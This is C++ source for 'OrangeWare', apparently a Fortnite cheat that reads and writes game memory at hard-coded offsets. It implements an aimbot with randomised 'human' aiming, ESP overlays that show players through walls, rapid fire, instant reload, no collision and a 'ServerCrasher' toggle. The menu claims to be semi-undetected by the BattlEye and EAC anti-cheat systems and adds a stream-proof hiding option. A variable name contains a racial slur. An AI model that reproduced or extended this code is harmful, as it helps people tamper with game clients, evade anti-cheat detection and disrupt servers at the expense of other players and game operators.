			write<float>(OFFSETS::PLAYER_CONTROLLER + 0x68, -1);
			write<float>(OFFSETS::CurrentWeapon + 0x68, FLT_MAX); //customtimedilation Updated 29.02.24
		}
		if (autorun)
		{
			write<char>(OFFSETS::PLAYER_CONTROLLER + 0xf55, -1); //bAutoRunOn Updated 29.02.24
		}
		if (niggerfovchanger)
		{
			int FOVVALUE = 500;
			uintptr_t PlayerCameraManager = read<uintptr_t>(PlayerController + OFFSETS::PlayerCameraManager); // APlayerController -  PlayerCameraManager Updated 29.02.24
			write<float>(PlayerCameraManager + OFFSETS::DefaultFOV + 0x4, 500); // APlayerCameraManager - DefaultFOV Updated 29.02.24
			write(PlayerCameraManager + OFFSETS::BaseFOV, 500); // AEmitterCameraLensEffectBase - BaseFOV Updated 29.02.24
		}
		if (InstaReload)
		{
			bool bIsReloadingWeapon = read<bool>(OFFSETS::CurrentWeapon + OFFSETS::bIsReloadingWeapon);
			uintptr_t Mesh = read<uintptr_t>(LocalPawn + OFFSETS::MESH);

			if (bIsReloadingWeapon)
			{
				write<float>(Mesh + OFFSETS::GlobalAnimRateScale, 999); //Updated 29.02.24
			}
			else
			{
				write<float>(Mesh + OFFSETS::GlobalAnimRateScale, 1); //Updated 29.02.24
			}

		}
		if (instantrevive) {
			write<float>(LocalPawn + OFFSETS::ReviveFromDBNOTime, 1); //ReviveFromDBNOTime //Updated 29.02.24
		}
		if (rapidfire)
		{
			float a = 0;
			float b = 0;

			uintptr_t CurrentWeapon = read<uintptr_t>(LocalPawn + OFFSETS::CurrentWeapon); //CurrentWeapon Offset
			if (CurrentWeapon) {
				a = read<float>(CurrentWeapon + 0xd78); //LastFireTime Offset Updated 29.02.24
				b = read<float>(CurrentWeapon + 0xd7c); //LastFireTimeVerified Offset Updated 29.02.24
				write<float>(CurrentWeapon + 0xd78, a + b - 0.0003); //LastFireTime Offset Updated 29.02.24
			}

		}
		if (instaReboot)
		{
			float ResurrectionStartDelay = read<float>(LocalPawn + OFFSETS::InteractingRebootVan + OFFSETS::ResurrectionStartDelay); ////AFortPlayerStateAthena InteractingRebootVan Updated 29.02.24
			if (ResurrectionStartDelay != 0.001f)
			{
				write<float>(LocalPawn + OFFSETS::InteractingRebootVan + OFFSETS::ResurrectionStartDelay, 0.001f); //ABuildingGameplayActorSpawnMachine ResurrectionStartDelay Updated 29.02.24
			}

		}
		if (ServerCrasher)
		{
			uintptr_t CurrentVehicle = read<uintptr_t>(LocalPawn + OFFSETS::CurrentVehicle);

			write<float>(CurrentVehicle + OFFSETS::VehicleAttributes + OFFSETS::ForwardForceTractionScale, FLT_MAX); //Updated 29.02.24
		}
		if (NoColision) {
			write<float>(processID + OFFSETS::LOCAL_PAWN + OFFSETS::bDisableCollision, 0.05f); //bDisableCollision Updated 29.02.24
			if (GetAsyncKeyState(VK_SHIFT))
			{
				write<float>(processID + OFFSETS::LOCAL_PAWN + OFFSETS::bIsSkydivingFromLaunchPad, 1.00f); //bIsSkydivingFromLaunchPad Updated 29.02.24
			}
		}
		if (NoEquipAnimation)
		{

			uintptr_t CurrentWeapon = read<uintptr_t>(LocalPawn + OFFSETS::CurrentWeapon); //CurrentWeapon Offset
			if (CurrentWeapon) {
				write<bool>(CurrentWeapon + OFFSETS::bDisableEquipAnimation, true); //bDisableEquipAnimation Offset Updated 29.02.24
			}

		}
		if (AimWhileJumping) { //Allows you to ADS when You are in the Air
			write<bool>(LocalPawn + OFFSETS::bADSWhileNotOnGround, true); //bADSWhileNotOnGround //Updated 29.02.24
		}
		else {
			write<bool>(LocalPawn + OFFSETS::bADSWhileNotOnGround, false); //bADSWhileNotOnGround //Updated 29.02.24
		}
		if (FirstPerson)
		{
			write<bool>(PlayerController + OFFSETS::OnSetFirstPersonCamera + 0x10 + 0x18, true); //Updated 29.02.24
		}
		if (watermark) {
			char dist[64];
			sprintf_s(dist, "\n", ImGui::GetIO().Framerate);
			ImGui::GetOverlayDrawList()->AddText(ImVec2(8, 2), IM_COL32(10, 108, 255, 255), dist);

			sprintf_s(dist, " OrangneWare Cheats | discord.gg/SJSxY4zcvm\n", ImGui::GetIO().Framerate);
			ImGui::GetOverlayDrawList()->AddText(ImVec2(8, 2), IM_COL32(10, 108, 255, 255), dist);

			sprintf_s(dist, " Current Verion v1.0\n", ImGui::GetIO().Framerate);
			ImGui::GetOverlayDrawList()->AddText(ImVec2(8, 15), IM_COL32(10, 108, 255, 255), dist);

		}
		if (fpsCounter)
		{
			char dist[64];
			XorS(frame, "%.1f Fps | OrangenWare Cheats \n");
			sprintf_s(dist, frame.decrypt(), 1.0f / ImGui::GetIO().DeltaTime);
			DrawText1(1530, 2, dist, &Col.red);
		}
		if (distance < VisDist)
		{
			if (Esp)
			{

				if (espbox)
				{
					if (IsVisible(CurrentActorMesh)) {
						DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(CorneredVisible[0] * 255, CorneredVisible[1] * 255, CorneredVisible[2] * 255), CorneredThickness);
					}
					if (!IsVisible(CurrentActorMesh)) {
						DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(CorneredNotVisible[0] * 255, CorneredNotVisible[1] * 255, CorneredNotVisible[2] * 255), CorneredThickness);
					}

				}
				Vector3 Headpos = getbone(CurrentActorMesh, 67);
				Vector3 vHeadBone = getbone(CurrentActorMesh, 68);
				Vector3 vRootBone = getbone(CurrentActorMesh, 0);
				Vector3 vHeadBoneOut = ProjectWorldToScreen(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
				Vector3 bone66 = getbone(CurrentActorMesh, 66);
				Vector3 top = ProjectWorldToScreen(bone66);
				Vector3 bone0 = getbone(CurrentActorMesh, 0);
				Vector3 bottom = ProjectWorldToScreen(bone0);
				Vector3 Headbox = ProjectWorldToScreen(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));
				Vector3 w2shead = ProjectWorldToScreen(Headpos);
				if (threedbox)
				{
					if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
					{
						ImU32 ESPSkeleton;
						if (IsVisible(CurrentActorMesh))
						{
							ESPSkeleton = ImColor({ threedBoxchikl[0], threedBoxchikl[1], threedBoxchikl[2] });
						}
						else if (IsVisible(CurrentActorMesh))
						{
							ESPSkeleton = ImColor({ threedBoxchikl[0], threedBoxchikl[1], threedBoxchikl[2] });
						}
						Vector3 bottom1 = ProjectWorldToScreen(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom2 = ProjectWorldToScreen(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom3 = ProjectWorldToScreen(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
						Vector3 bottom4 = ProjectWorldToScreen(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));
						Vector3 top1 = ProjectWorldToScreen(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top2 = ProjectWorldToScreen(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top3 = ProjectWorldToScreen(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
						Vector3 top4 = ProjectWorldToScreen(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), ESPSkeleton, 3.f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), ESPSkeleton, 3.f);
					}
				}
				if (Headdot) {
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Headbox.x, Headbox.y), float(BoxHeight / 25), IM_COL32(255, 3, 3, 255), 50);
				}
				if (HeadESP)
				{
					Vector3 bottom1 = ProjectWorldToScreen(Vector3(Headpos.x + 10, Headpos.y - 10, Headpos.z));
					Vector3 bottom2 = ProjectWorldToScreen(Vector3(Headpos.x - 10, Headpos.y - 10, Headpos.z));
					Vector3 bottom3 = ProjectWorldToScreen(Vector3(Headpos.x - 10, Headpos.y + 10, Headpos.z));
					Vector3 bottom4 = ProjectWorldToScreen(Vector3(Headpos.x + 10, Headpos.y + 10, Headpos.z));

					Vector3 top1 = ProjectWorldToScreen(Vector3(Headpos.x + 10, Headpos.y - 10, Headpos.z + 17));
					Vector3 top2 = ProjectWorldToScreen(Vector3(Headpos.x - 10, Headpos.y - 10, Headpos.z + 17));
					Vector3 top3 = ProjectWorldToScreen(Vector3(Headpos.x - 10, Headpos.y + 10, Headpos.z + 17));
					Vector3 top4 = ProjectWorldToScreen(Vector3(Headpos.x + 10, Headpos.y + 10, Headpos.z + 17));

					ImU32 Cay = ImGui::GetColorU32({ 255, 215, 0, 255 });

					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), Cay, 3.f);

					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), Cay, 3.f);

					ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), Cay, 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), Cay, 3.f);
				}
				if (CrosshairLines)
				{

					if (IsVisible(CurrentActorMesh)) {
						DrawLine(Width / 2, Height / 2, HeadElvar.x, HeadElvar.y, &Col.blue, 2.5);
					}
					if (!IsVisible(CurrentActorMesh)) {
						DrawLine(Width / 2, Height / 2, HeadElvar.x, HeadElvar.y, &Col.red, 2.5);
					}

				}
				if (Esp_Line) {


					if (IsVisible(CurrentActorMesh)) {
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height), ImVec2(bottom.x, bottom.y), ImColor(ButtomLineVisible[0] * 255, ButtomLineVisible[1] * 255, ButtomLineVisible[2] * 255), ButtomLineThickness);
					}
					if (!IsVisible(CurrentActorMesh)) {
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height), ImVec2(bottom.x, bottom.y), ImColor(ButtomLineNotVisible[0] * 255, ButtomLineNotVisible[1] * 255, ButtomLineNotVisible[2] * 255), ButtomLineThickness);
					}

				}
				if (TriangleEsp) {
					if (IsVisible(CurrentActorMesh)) {
						DrawCorneredTriangle(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(CorneredVisible[0] * 255, CorneredVisible[1] * 255, CorneredVisible[2] * 255), CorneredThickness);
					}
					else {
						DrawCorneredTriangle(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(CorneredVisible[0] * 255, CorneredVisible[1] * 255, CorneredVisible[2] * 255), CorneredThickness);
					}
				}
				if (DynamicEsp)
				{
					Vector3 bottom1 = ProjectWorldToScreen(Vector3(vRootBone.x + 40, vRootBone.y - 1, vRootBone.z));
					Vector3 bottom2 = ProjectWorldToScreen(Vector3(vRootBone.x - 40, vRootBone.y - 1, vRootBone.z));
					Vector3 bottom3 = ProjectWorldToScreen(Vector3(vRootBone.x - 40, vRootBone.y - 1, vRootBone.z));
					Vector3 bottom4 = ProjectWorldToScreen(Vector3(vRootBone.x + 40, vRootBone.y - 1, vRootBone.z));
					Vector3 top1 = ProjectWorldToScreen(Vector3(vHeadBone.x + 40, vHeadBone.y, vHeadBone.z + 15));
					Vector3 top2 = ProjectWorldToScreen(Vector3(vHeadBone.x - 40, vHeadBone.y, vHeadBone.z + 15));
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), ImColor(0, 0, 0, 255), 3.1f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), ImColor(0, 0, 0, 255), 3.1f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), ImColor(0, 0, 0, 255), 3.1f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), ImColor(0, 0, 0, 255), 3.1f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), ImColor(255, 3, 3, 255), 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), ImColor(255, 3, 3, 255), 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), ImColor(255, 3, 3, 255), 3.f);
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), ImColor(255, 3, 3, 255), 3.f);
				}
				if (Esp_fbox)
				{
					if (!IsVisible(CurrentActorMesh))
					{
						DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(CorneredVisible[0] * 255, CorneredVisible[1] * 255, CorneredVisible[2] * 255), 2.5f);
					}
					else {
						DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(CorneredVisible[0] * 255, CorneredVisible[1] * 255, CorneredVisible[2] * 255), 2.5f);
					}

				}
				if (fillbox)
				{
					DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor({ cornerchick[0], cornerchick[1], cornerchick[2] }), BoxThickness);
					DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.FiledBox);
				}
				if (Esp_Distance)
				{


					XorS(dst, "[%.fm]\n");
					char dist[64];
					sprintf_s(dist, dst.decrypt(), distance);
					DrawOutlinedText(m_pFont, dist, ImVec2(bottom.x, bottom.y - 35), 23.0f, IM_COL32(255, 0, 0, 255), true);


				}
				if (SkeletonEsp)
				{
					skeleton(CurrentActorMesh);
				}
				if (VisibleCheck) {
					float LastSumbitTime = read<float>(OFFSETS::MESH + OFFSETS::LastSubmitTime);
					float LastRenderTimeOnScreen = read<float>(OFFSETS::MESH + OFFSETS::LastRenderTimeOnScreen);

					bool Visible = LastRenderTimeOnScreen + 0.06f >= LastSumbitTime;
				}

				auto dx = w2shead.x - (Width / 2);
				auto dy = w2shead.y - (Height / 2);
				auto dist = sqrtf(dx * dx + dy * dy);


				if (IsVisible(CurrentActorMesh) || !VisibleCheck) {

					if (dist < AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = CurrentActor;
					}
				}

			}
			if (Aimbot)
			{
				if (humanAim)
				{
					if (Aimbot && closestPawn && GetAsyncKeyState(hotkeys::aimkey) < 0) {

						std::srand(static_cast<unsigned int>(std::time(nullptr)));
						int randomValue = std::rand() % 3;
						if (randomValue < 2) {
							//  2/3 of the time
							AimAt(closestPawn);
						}
					}
				}
				if (Aimbot && closestPawn && GetAsyncKeyState(hotkeys::aimkey) < 0) {
					AimAt(closestPawn);
				}

			}
		}
	}
}

ImDrawList* draw;
void render()
{
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	if (GetAsyncKeyState(VK_INSERT))
	{
		ShowMenu = !ShowMenu;
		Sleep(100);
	}

	static int maintabs;
	static ImVec2 pos(180, 100);
	ImGui::PushFont(DefaultFont);
	ImGui::SetNextWindowSize({ 442, 300 });
	if (ShowMenu)
	{
		ImGui::Begin("", NULL, 59);
		ImGui::Spacing();
		ImGui::Spacing();
		ImGui::SetCursorPos(ImVec2(15.000f, 10.000f));
		ImGui::Text("                  OrangeWare BETA | https://discord.gg/SJSxY4zcvm | Last Update " __DATE__);
		ImGui::Spacing();
		ImGui::Separator();

		ImGui::SetCursorPos({ 20,8.f });
		if (ImGui::Button("X", ImVec2(20, 20))) {
			exit(0);
		}

		ImGui::SetCursorPos({ 8,45.f });
		if (ImGui::Button("Aimbot", { 80,30 }))
		{
			maintabs = 1;
		}
		ImGui::SetCursorPos({ 95,45.f });
		if (ImGui::Button("Visuals", { 80, 30 }))
		{
			maintabs = 2;
		}
		ImGui::SetCursorPos({ 181,45.f });
		if (ImGui::Button("Misc", { 80,30 }))
		{
			maintabs = 3;
		}
		ImGui::SetCursorPos({ 268,45.f });
		if (ImGui::Button("Exploits (Soon)", { 80,30 }))
		{
			maintabs = 4;
		}
		ImGui::SetCursorPos({ 353,45.f });
		if (ImGui::Button("Colors", { 80,30 }))
		{
			maintabs = 5;
		}

		if (maintabs == 0)
		{
			ImGui::Text(" [ + ] OrangeWare BETA 1.0");
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::Text(" [ + ] ( Update News ) Last Update 06.03.24");
			ImGui::Text(" [ + ] New ImGui Menu");
			ImGui::Text(" [ + ] New Exploits (Currently unavailable)");
			ImGui::Text(" [ + ] New Function and better Performance");
			ImGui::Spacing();
			ImGui::TextColored(ImColor(255, 162, 0), " [ + ] Currently Semi Undected On BE");
			ImGui::TextColored(ImColor(255, 162, 0), " [ + ] Currently Semi Undected On EAC");
			ImGui::Text(" [ + ] OrangeWare Reborn External");
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::TextColored(ImColor(255, 0, 0), "OrangeWare Discord");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("discord.gg/SJSxY4zcvm"));
				ImGui::EndTooltip();
			}
		}
		if (maintabs == 1)
		{
			ImGui::Spacing();
			ImGui::Checkbox("Enable Aimbot", &Aimbot);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To turn Aimbot On and Off"));
				ImGui::EndTooltip();
			}
			ImGui::SameLine();
			ImGui::Checkbox("Visible Check ( Updating... )", &VisibleCheck);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To see if the player is visible"));
				ImGui::EndTooltip();
			}
			HotkeyButton(hotkeys::aimkey, ChangeKey, keystatus);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("The Button you press to aim at the Player"));
				ImGui::EndTooltip();
			}
			ImGui::Combo("Aim Bones", &aimbone, hitboxes, sizeof(hitboxes) / sizeof(*hitboxes));
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To choose where you want to Aim (Example: head, body or foot)"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("Draw FOV", &enablefov);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To draw the fov in which area the Aimbot should work"));
				ImGui::EndTooltip();
			}
			if (enablefov)
			{
				ImGui::Checkbox("Circle FOV", &fovcircle);
				if (fovcircle)
				{
					SquareFovFilled = false;
					squarefov = false;
					filledfov = false;
				}
				ImGui::Checkbox("Filled Circle FOV", &filledfov);
				if (filledfov)
				{
					fovcircle = false;
					squarefov = false;
					SquareFovFilled = false;
				}
				ImGui::Checkbox("Square FOV", &squarefov);
				if (squarefov)
				{
					filledfov = false;
					fovcircle = false;
					SquareFovFilled = false;
				}
				ImGui::Checkbox("Square Filled FOV", &SquareFovFilled);
				if (SquareFovFilled)
				{
					squarefov = false;
					filledfov = false;
					fovcircle = false;
				}
			}
			ImGui::Spacing();
			ImGui::SliderFloat("FOV Size", &AimFOV, 50, 800);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To change the size of the FOV"));
				ImGui::EndTooltip();
			}
			ImGui::SliderInt("Aimbot Smoothness", &smooth, 2, 10);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To change the size of the Aimbot Smoothing"));
				ImGui::EndTooltip();
			}
		}
		if (maintabs == 2)
		{
			ImGui::Spacing();
			ImGui::BeginChild("##child3", ImVec2(ImGui::GetContentRegionAvail().x / 2.1, ImGui::GetContentRegionAvail().y / 1), true, ImGuiWindowFlags_NoResize);
			ImGui::Checkbox("Enable ESP", &Esp);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To enable all other ESP futures"));
				ImGui::EndTooltip();
			}
			if (Esp)
			{
				ImGui::Checkbox("Corner Box Esp", &espbox);
				ImGui::Checkbox("2D Box Esp", &Esp_fbox);
				ImGui::Checkbox("Fillbox Esp", &fillbox);
				ImGui::Checkbox("Triangle Esp", &TriangleEsp);
				ImGui::Checkbox("Head Esp", &HeadESP);
				ImGui::Checkbox("Headdot Esp", &Headdot);
				ImGui::EndChild();
				ImGui::SameLine();
				ImGui::BeginChild("##child4", ImVec2(ImGui::GetContentRegionAvail().x / 1, ImGui::GetContentRegionAvail().y / 1), true, ImGuiWindowFlags_NoResize);
				ImGui::Checkbox("Dynamic Esp", &DynamicEsp);
				ImGui::Checkbox("3D Box Esp", &threedbox);
				ImGui::Checkbox("Skeleton Esp", &SkeletonEsp);
				ImGui::Checkbox("CrosshairLines", &CrosshairLines);
				ImGui::Checkbox("BottomLines", &Esp_Line);
				ImGui::Spacing();
				ImGui::Checkbox("Distance Esp", &Esp_Distance);
				ImGui::SliderInt("Visdistance", &VisDist, 1200.f, 3000.f);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
				if (ImGui::IsItemHovered()) {
					ImGui::BeginTooltip();
					ImGui::Text(("To change the Esp View Distance"));
					ImGui::EndTooltip();
				}
			}
		}
		if (maintabs == 3)
		{
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::Checkbox("Crosshair", &crosshair);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Draw a Crosshair on the Screen"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("Fps Counter", &fpsCounter);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To Draw a Fps Counter on you Screen to see you Fps"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("Watermark", &watermark);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To Draw a Watermark on your Screen"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("Streamproof", &WindowStreamProof);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 0, 0), ("( ? ) "));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("To protect against Streaming or transmissions like Discord or smth"));
				ImGui::EndTooltip();
			}
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::SliderFloat(("Box Thickness"), &BoxThickness, 0.f, 8);
			ImGui::SliderFloat(("Cornered Thickness"), &CorneredThickness, 0.f, 8);
			ImGui::SliderFloat(("Skeleton Thickness"), &Skeleton_Thickness, 0.f, 8);
			ImGui::SliderFloat(("Buttom Line Thickness"), &ButtomLineThickness, 0.f, 8);
		}
		//if (maintabs == 4)
	//	{
			//ImGui::Spacing();
			//ImGui::BeginChild("##child5", ImVec2(ImGui::GetContentRegionAvail().x / 2.1, ImGui::GetContentRegionAvail().y / 1), true, ImGuiWindowFlags_NoResize);
			//ImGui::Checkbox("FirstPerson", &FirstPerson);
			//ImGui::Checkbox("AimWhileJumping", &AimWhileJumping);
			//ImGui::Checkbox("NoEquipAnimation", &NoEquipAnimation);
			//ImGui::Checkbox("NoColision", &NoColision);
			//ImGui::Checkbox("ServerCrasher", &ServerCrasher);
			//ImGui::Checkbox("InstaReboot", &instaReboot);
			//ImGui::Checkbox("RapidFire", &rapidfire);
			//ImGui::Checkbox("InstantRevive", &instantrevive);
			//ImGui::Checkbox("InstaReload", &InstaReload);
			//ImGui::Checkbox("FovChanger", &niggerfovchanger);
			//ImGui::Checkbox("AutoRun", &autorun);
			//ImGui::EndChild();
			//ImGui::SameLine();
			//ImGui::BeginChild("##child6", ImVec2(ImGui::GetContentRegionAvail().x / 1, ImGui::GetContentRegionAvail().y / 1), true, ImGuiWindowFlags_NoResize);
			//ImGui::Checkbox("NoBloom", &NoBloom);
			//ImGui::Checkbox("Invisible", &invisible);
			//ImGui::Checkbox("TPose", &TPose);
			//ImGui::Checkbox("PlayerFly", &playerFly);
			//ImGui::Checkbox("TinyPlayers", &tinyplayers);
			//ImGui::Checkbox("BigPlayer", &bigPlayer);
			//ImGui::Checkbox("CarFly", &carFly);
			//ImGui::Checkbox("CarFlytwo", &carFlytwo);
			//ImGui::Checkbox("AirStuck", &AirStuck);
			//ImGui::Checkbox("NoRecoil", &clientspinbot);
			//ImGui::Checkbox("DoublePump", &doublepump);
			//ImGui::Checkbox("Spinbot", &clientspinbot);
     //	}
		if (maintabs == 5)
		{
			ImGui::Text("Configure the colors of the Esp Boxes:");
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::ColorEdit3(("Crosshair Color"), crosshairchick);
			ImGui::ColorEdit3(("Fillbox Color"), cornerchick);
			ImGui::ColorEdit3(("Corner/2D/Triangel Esp Color "), CorneredVisible);
			ImGui::ColorEdit3(("3D Box Color"), threedBoxchikl);
			ImGui::ColorEdit3(("Skeleton Color"), SkeletonVisible);
			ImGui::ColorEdit3(("Fov Circle Color"), fovchick);
			ImGui::ColorEdit3(("ButtomLine Color"), ButtomLineVisible);
		}

		ImGui::End();
	}
actorloop();

ImGui::EndFrame();
D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

if (D3dDevice->BeginScene() >= 0)
{
	ImGui::Render();
	ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
	D3dDevice->EndScene();
}
HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

